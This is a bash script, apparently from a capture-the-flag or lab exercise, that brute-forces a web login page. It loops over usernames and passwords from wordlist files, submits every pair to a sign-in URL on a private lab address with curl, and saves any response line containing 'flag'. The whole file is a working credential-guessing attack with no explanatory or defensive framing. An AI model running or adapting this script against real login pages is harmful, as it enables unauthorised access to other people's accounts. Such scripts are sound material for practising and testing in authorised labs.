#!/bin/bash

PASSWORD_FILE="collection.txt"
USERNAME_FILE="admin-user.txt"
URL="http://192.168.56.101/index.php?page=signin"

rm line_with_flag.txt

for username in $(cat "$USERNAME_FILE"); do
	for password in $(cat "$PASSWORD_FILE"); do
    	echo "Trying: $username + $password"
    	curl -s -X POST "$URL&username=$username&password=$password&Login=Login#" | grep 'flag' >> line_with_flag.txt
	done
done
